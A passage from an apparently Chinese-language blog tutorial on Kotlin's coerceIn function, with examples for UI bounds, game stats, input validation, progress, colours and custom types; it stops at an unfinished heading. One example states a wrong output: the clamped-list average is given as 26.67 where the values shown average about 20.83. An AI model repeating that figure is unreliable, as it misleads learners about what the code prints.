                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong><code>coerceIn</code></strong> 是 Kotlin 标准库中的一个扩展函数，用于<strong>将一个值限制在指定的范围内</strong>。如果值在范围内，则返回该值；如果小于最小值，则返回最小值；如果大于最大值，则返回最大值。</p>
<h2 data-id="heading-0">基本语法</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 限制在最小值和最大值之间</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Comparable&lt;T&gt;</span>&gt; T.<span class="hljs-title">coerceIn</span><span class="hljs-params">(minimumValue: <span class="hljs-type">T</span>, maximumValue: <span class="hljs-type">T</span>)</span></span>: T

<span class="hljs-comment">// 限制在一个范围内</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Comparable&lt;T&gt;</span>&gt; T.<span class="hljs-title">coerceIn</span><span class="hljs-params">(range: <span class="hljs-type">ClosedRange</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T
</code></pre>
<h2 data-id="heading-1">基本用法</h2>
<h3 data-id="heading-2"><strong>1. 数值范围限制</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 基本整数限制</span>
    <span class="hljs-keyword">val</span> x = <span class="hljs-number">10</span>
    <span class="hljs-keyword">val</span> clamped1 = x.coerceIn(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 10 &gt; 5，所以返回 5</span>
    println(clamped1)  <span class="hljs-comment">// 输出: 5</span>
    
    <span class="hljs-keyword">val</span> clamped2 = x.coerceIn(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>)  <span class="hljs-comment">// 10 &lt; 20，所以返回 20</span>
    println(clamped2)  <span class="hljs-comment">// 输出: 20</span>
    
    <span class="hljs-keyword">val</span> clamped3 = x.coerceIn(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>)  <span class="hljs-comment">// 10 在范围内，返回 10</span>
    println(clamped3)  <span class="hljs-comment">// 输出: 10</span>
    
    <span class="hljs-comment">// 浮点数限制</span>
    <span class="hljs-keyword">val</span> pi = <span class="hljs-number">3.14</span>
    <span class="hljs-keyword">val</span> clampedPi = pi.coerceIn(<span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>)  <span class="hljs-comment">// 3.14 &gt; 1.0，返回 1.0</span>
    println(clampedPi)  <span class="hljs-comment">// 输出: 1.0</span>
    
    <span class="hljs-comment">// 字符限制</span>
    <span class="hljs-keyword">val</span> char = <span class="hljs-string">'g'</span>
    <span class="hljs-keyword">val</span> clampedChar = char.coerceIn(<span class="hljs-string">'a'</span>, <span class="hljs-string">'f'</span>)  <span class="hljs-comment">// 'g' &gt; 'f'，返回 'f'</span>
    println(clampedChar)  <span class="hljs-comment">// 输出: f</span>
}
</code></pre>
<h3 data-id="heading-3"><strong>2. 使用范围对象</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">15</span>
    
    <span class="hljs-comment">// 使用范围对象</span>
    <span class="hljs-keyword">val</span> range1 = <span class="hljs-number">10.</span><span class="hljs-number">.20</span>
    <span class="hljs-keyword">val</span> result1 = value.coerceIn(range1)
    println(result1)  <span class="hljs-comment">// 输出: 15</span>
    
    <span class="hljs-keyword">val</span> range2 = <span class="hljs-number">1.</span><span class="hljs-number">.5</span>
    <span class="hljs-keyword">val</span> result2 = value.coerceIn(range2)
    println(result2)  <span class="hljs-comment">// 输出: 5</span>
    
    <span class="hljs-keyword">val</span> range3 = <span class="hljs-number">20.</span><span class="hljs-number">.30</span>
    <span class="hljs-keyword">val</span> result3 = value.coerceIn(range3)
    println(result3)  <span class="hljs-comment">// 输出: 20</span>
    
    <span class="hljs-comment">// 使用 until（半开区间，需要先转换为闭区间）</span>
    <span class="hljs-keyword">val</span> halfOpen = <span class="hljs-number">10</span> until <span class="hljs-number">20</span>  <span class="hljs-comment">// 10..19</span>
    <span class="hljs-keyword">val</span> closedRange = <span class="hljs-number">10.</span><span class="hljs-number">.19</span>
    println(value.coerceIn(closedRange))  <span class="hljs-comment">// 输出: 15</span>
}
</code></pre>
<h2 data-id="heading-4">实际应用场景</h2>
<h3 data-id="heading-5"><strong>1. UI 开发中的边界检查</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> width: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> height: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">moveTo</span><span class="hljs-params">(newX: <span class="hljs-type">Int</span>, newY: <span class="hljs-type">Int</span>, screenWidth: <span class="hljs-type">Int</span>, screenHeight: <span class="hljs-type">Int</span>)</span></span>: View {
        <span class="hljs-comment">// 确保视图不会移出屏幕</span>
        <span class="hljs-keyword">val</span> clampedX = newX.coerceIn(<span class="hljs-number">0</span>, screenWidth - width)
        <span class="hljs-keyword">val</span> clampedY = newY.coerceIn(<span class="hljs-number">0</span>, screenHeight - height)
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.copy(x = clampedX, y = clampedY)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> screen = View(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">800</span>, <span class="hljs-number">600</span>)
    <span class="hljs-keyword">val</span> dialog = View(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150</span>)
    
    <span class="hljs-comment">// 尝试移动到屏幕外</span>
    <span class="hljs-keyword">val</span> moved = dialog.moveTo(<span class="hljs-number">700</span>, <span class="hljs-number">500</span>, screen.width, screen.height)
    println(<span class="hljs-string">"Dialog position: (<span class="hljs-subst">${moved.x}</span>, <span class="hljs-subst">${moved.y}</span>)"</span>)
    <span class="hljs-comment">// 输出: Dialog position: (600, 450)</span>
    <span class="hljs-comment">// 因为 700 &gt; (800-200=600)，500 &gt; (600-150=450)</span>
}
</code></pre>
<h3 data-id="heading-6"><strong>2. 游戏开发</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameCharacter</span>(
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">var</span> health: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">var</span> position: Position
) {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Position</span>(<span class="hljs-keyword">var</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">var</span> y: <span class="hljs-built_in">Int</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(dx: <span class="hljs-type">Int</span>, dy: <span class="hljs-type">Int</span>, worldBounds: <span class="hljs-type">IntRange</span>)</span></span> {
        position.x = (position.x + dx).coerceIn(worldBounds)
        position.y = (position.y + dy).coerceIn(worldBounds)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">takeDamage</span><span class="hljs-params">(damage: <span class="hljs-type">Int</span>)</span></span> {
        health = (health - damage).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heal</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>)</span></span> {
        health = (health + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> player = GameCharacter(<span class="hljs-string">"Hero"</span>, <span class="hljs-number">80</span>, GameCharacter.Position(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>))
    <span class="hljs-keyword">val</span> worldBounds = <span class="hljs-number">0.</span><span class="hljs-number">.10</span>
    
    <span class="hljs-comment">// 移动 - 不会超出边界</span>
    player.move(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, worldBounds)
    println(<span class="hljs-string">"Position: (<span class="hljs-subst">${player.position.x}</span>, <span class="hljs-subst">${player.position.y}</span>)"</span>)
    <span class="hljs-comment">// 输出: Position: (8, 10) 而不是 (8, 12)</span>
    
    <span class="hljs-comment">// 受到伤害</span>
    player.takeDamage(<span class="hljs-number">90</span>)
    println(<span class="hljs-string">"Health: <span class="hljs-subst">${player.health}</span>"</span>)  <span class="hljs-comment">// 输出: Health: 0</span>
    
    <span class="hljs-comment">// 治疗</span>
    player.heal(<span class="hljs-number">120</span>)
    println(<span class="hljs-string">"Health: <span class="hljs-subst">${player.health}</span>"</span>)  <span class="hljs-comment">// 输出: Health: 100</span>
}
</code></pre>
<h3 data-id="heading-7"><strong>3. 数据验证和规范化</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInput</span>(
    <span class="hljs-keyword">val</span> username: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Double</span>
) {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> AGE_RANGE = <span class="hljs-number">0.</span><span class="hljs-number">.150</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> SCORE_RANGE = <span class="hljs-number">0.0</span>.<span class="hljs-number">.100</span><span class="hljs-number">.0</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> USERNAME_LENGTH_RANGE = <span class="hljs-number">3.</span><span class="hljs-number">.20</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">validate</span><span class="hljs-params">()</span></span>: ValidatedUserInput {
        <span class="hljs-keyword">val</span> validatedAge = age.coerceIn(AGE_RANGE)
        <span class="hljs-keyword">val</span> validatedScore = score.coerceIn(SCORE_RANGE)
        <span class="hljs-keyword">val</span> validatedUsername = <span class="hljs-keyword">if</span> (username.length <span class="hljs-keyword">in</span> USERNAME_LENGTH_RANGE) {
            username
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 截断或处理用户名长度</span>
            username.take(USERNAME_LENGTH_RANGE.last)
        }
        
        <span class="hljs-keyword">return</span> ValidatedUserInput(validatedUsername, validatedAge, validatedScore)
    }
}

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidatedUserInput</span>(
    <span class="hljs-keyword">val</span> username: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Double</span>
)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> input1 = UserInput(<span class="hljs-string">"john_doe"</span>, <span class="hljs-number">25</span>, <span class="hljs-number">85.5</span>)
    <span class="hljs-keyword">val</span> validated1 = input1.validate()
    println(validated1)  <span class="hljs-comment">// 输出: ValidatedUserInput(username=john_doe, age=25, score=85.5)</span>
    
    <span class="hljs-keyword">val</span> input2 = UserInput(<span class="hljs-string">"jo"</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150.0</span>)  <span class="hljs-comment">// 不合规的数据</span>
    <span class="hljs-keyword">val</span> validated2 = input2.validate()
    println(validated2)  
    <span class="hljs-comment">// 输出: ValidatedUserInput(username=jo, age=150, score=100.0)</span>
}
</code></pre>
<h3 data-id="heading-8"><strong>4. 进度和百分比计算</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProgressTracker</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> totalSteps: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentStep: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">progress</span><span class="hljs-params">(percent: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Float</span> {
        <span class="hljs-comment">// 确保百分比在 0-100 之间</span>
        <span class="hljs-keyword">val</span> validPercent = percent.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        <span class="hljs-keyword">return</span> validPercent / <span class="hljs-number">100f</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">advance</span><span class="hljs-params">(steps: <span class="hljs-type">Int</span>)</span></span> {
        currentStep = (currentStep + steps).coerceIn(<span class="hljs-number">0</span>, totalSteps)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">retreat</span><span class="hljs-params">(steps: <span class="hljs-type">Int</span>)</span></span> {
        currentStep = (currentStep - steps).coerceIn(<span class="hljs-number">0</span>, totalSteps)
    }
    
    <span class="hljs-keyword">val</span> progressPercentage: <span class="hljs-built_in">Int</span>
        <span class="hljs-keyword">get</span>() = (currentStep * <span class="hljs-number">100</span> / totalSteps).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> tracker = ProgressTracker(<span class="hljs-number">50</span>)
    
    tracker.advance(<span class="hljs-number">30</span>)
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// 输出: Progress: 60%</span>
    
    tracker.advance(<span class="hljs-number">40</span>)  <span class="hljs-comment">// 尝试超过总量</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// 输出: Progress: 100%</span>
    
    tracker.retreat(<span class="hljs-number">100</span>)  <span class="hljs-comment">// 尝试低于 0</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// 输出: Progress: 0%</span>
    
    <span class="hljs-keyword">val</span> progress = tracker.progress(<span class="hljs-number">150</span>)  <span class="hljs-comment">// 超过 100%</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-variable">$progress</span>"</span>)  <span class="hljs-comment">// 输出: Progress: 1.0</span>
}
</code></pre>
<h3 data-id="heading-9"><strong>5. 颜色值处理</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span>(<span class="hljs-keyword">val</span> r: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> g: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> b: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-keyword">init</span> {
        require(r <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span> &amp;&amp; g <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span> &amp;&amp; b <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span>) {
            <span class="hljs-string">"颜色值必须在 0-255 之间"</span>
        }
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fromValues</span><span class="hljs-params">(red: <span class="hljs-type">Int</span>, green: <span class="hljs-type">Int</span>, blue: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-comment">// 使用 coerceIn 确保颜色值在有效范围内</span>
            <span class="hljs-keyword">val</span> safeRed = red.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> safeGreen = green.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> safeBlue = blue.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(safeRed, safeGreen, safeBlue)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">darken</span><span class="hljs-params">(color: <span class="hljs-type">Color</span>, amount: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-keyword">val</span> newRed = (color.r - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newGreen = (color.g - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newBlue = (color.b - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(newRed, newGreen, newBlue)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">lighten</span><span class="hljs-params">(color: <span class="hljs-type">Color</span>, amount: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-keyword">val</span> newRed = (color.r + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newGreen = (color.g + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newBlue = (color.b + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(newRed, newGreen, newBlue)
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 创建颜色，自动处理边界</span>
    <span class="hljs-keyword">val</span> color1 = Color.fromValues(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>)  <span class="hljs-comment">// 300 会被限制为 255</span>
    println(color1)  <span class="hljs-comment">// 输出: Color(r=100, g=200, b=255)</span>
    
    <span class="hljs-keyword">val</span> darker = Color.darken(color1, <span class="hljs-number">150</span>)  <span class="hljs-comment">// 尝试减少 150</span>
    println(darker)  <span class="hljs-comment">// 输出: Color(r=0, g=50, b=105)</span>
    
    <span class="hljs-keyword">val</span> lighter = Color.lighten(color1, <span class="hljs-number">200</span>)  <span class="hljs-comment">// 尝试增加 200</span>
    println(lighter)  <span class="hljs-comment">// 输出: Color(r=255, g=255, b=255)</span>
}
</code></pre>
<h2 data-id="heading-10">高级用法</h2>
<h3 data-id="heading-11"><strong>1. 自定义比较类型</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义可比较类型</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Temperature</span>(<span class="hljs-keyword">val</span> celsius: <span class="hljs-built_in">Double</span>) : Comparable&lt;Temperature&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(other: <span class="hljs-type">Temperature</span>)</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> celsius.compareTo(other.celsius)
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">val</span> WATER_FREEZING = Temperature(<span class="hljs-number">0.0</span>)
        <span class="hljs-keyword">val</span> WATER_BOILING = Temperature(<span class="hljs-number">100.0</span>)
        <span class="hljs-keyword">val</span> HUMAN_BODY = Temperature(<span class="hljs-number">37.0</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> currentTemp = Temperature(<span class="hljs-number">25.0</span>)
    <span class="hljs-keyword">val</span> comfortableRange = Temperature(<span class="hljs-number">20.0</span>)..Temperature(<span class="hljs-number">26.0</span>)
    
    <span class="hljs-keyword">val</span> adjustedTemp = currentTemp.coerceIn(comfortableRange)
    println(<span class="hljs-string">"舒适温度: <span class="hljs-subst">${adjustedTemp.celsius}</span>°C"</span>)  <span class="hljs-comment">// 输出: 舒适温度: 25.0°C</span>
    
    <span class="hljs-keyword">val</span> hotTemp = Temperature(<span class="hljs-number">40.0</span>)
    <span class="hljs-keyword">val</span> safeTemp = hotTemp.coerceIn(Temperature.WATER_FREEZING, Temperature.WATER_BOILING)
    println(<span class="hljs-string">"安全温度: <span class="hljs-subst">${safeTemp.celsius}</span>°C"</span>)  <span class="hljs-comment">// 输出: 安全温度: 40.0°C</span>
}
</code></pre>
<h3 data-id="heading-12"><strong>2. 与集合操作结合</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> values = listOf(-<span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">25</span>, <span class="hljs-number">35</span>, <span class="hljs-number">45</span>)
    <span class="hljs-keyword">val</span> range = <span class="hljs-number">0.</span><span class="hljs-number">.30</span>
    
    <span class="hljs-comment">// 将列表中的所有值限制在范围内</span>
    <span class="hljs-keyword">val</span> clampedValues = values.map { it.coerceIn(range) }
    println(clampedValues)  <span class="hljs-comment">// 输出: [0, 5, 15, 25, 30, 30]</span>
    
    <span class="hljs-comment">// 计算平均值，但先限制每个值</span>
    <span class="hljs-keyword">val</span> average = values
        .map { it.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>) }
        .average()
    println(<span class="hljs-string">"限制后的平均值: <span class="hljs-variable">$average</span>"</span>)  <span class="hljs-comment">// 输出: 限制后的平均值: 26.666666666666668</span>
}
</code></pre>
<h3 data-id="heading-13"><strong>3. 链式调用</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RangeSlider</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> value: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> range: ClosedRange&lt;<span class="hljs-built_in">Double</span>&gt;) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">adjust</span><span class="hljs-params">(amount: <span class="hljs-type">Double</span>)</span></span>: RangeSlider {
        value = (value + amount).coerceIn(range)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">multiply</span><span class="hljs-params">(factor: <span class="hljs-type">Double</span>)</span></span>: RangeSlider {
        value = (value * factor).coerceIn(range)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> = value
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> slider = RangeSlider(<span class="hljs-number">50.0</span>, <span class="hljs-number">0.0</span>.<span class="hljs-number">.100</span><span class="hljs-number">.0</span>)
    
    <span class="hljs-keyword">val</span> result = slider
        .adjust(<span class="hljs-number">30.0</span>)    <span class="hljs-comment">// 80.0</span>
        .multiply(<span class="hljs-number">1.5</span>)   <span class="hljs-comment">// 120.0 → 限制为 100.0</span>
        .adjust(-<span class="hljs-number">150.0</span>)  <span class="hljs-comment">// -50.0 → 限制为 0.0</span>
        .getValue()
    
    println(<span class="hljs-string">"滑块值: <span class="hljs-variable">$result</span>"</span>)  <span class="hljs-comment">// 输出: 滑块值: 0.0</span>
}
</code></pre>
<h2 data-id="heading-14">注意事项和边界情况</h2>
<h3 data-id="heading-15"><strong>1. 范围有效性检查</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">10</span>
    
    <span class="hljs-comment">// 范围必须有效（最小值 ≤ 最大值）</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> result = value.coerceIn(<span class="hljs-number">20</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// 最小值 &gt; 最大值</span>
    } <span class="hljs-keyword">catch</span> (e: IllegalArgumentException) {
        println(<span class="hljs-string">"错误: <span class="hljs-subst">${e.message}</span>"</span>)  
        <span class="hljs-comment">// 输出: 错误: Cannot coerce value to an empty range: maximum 10 is less than minimum 20.</span>
    }
    
    <span class="hljs-comment">// 正确的做法是确保范围有效</span>
    <span class="hljs-keyword">val</span> min = <span class="hljs-number">20</span>
    <span class="hljs-keyword">val</span> max = <span class="hljs-number">10</span>
    <span class="hljs-keyword">if</span> (min &lt;= max) {
        <span class="hljs-keyword">val</span> result = value.coerceIn(min, max)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 处理无效范围</span>
        println(<span class="hljs-string">"范围无效: <span class="hljs-variable">$min</span> &gt; <span class="hljs-variable">$max</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-16"><strong>2. 空范围处理</strong></h3>
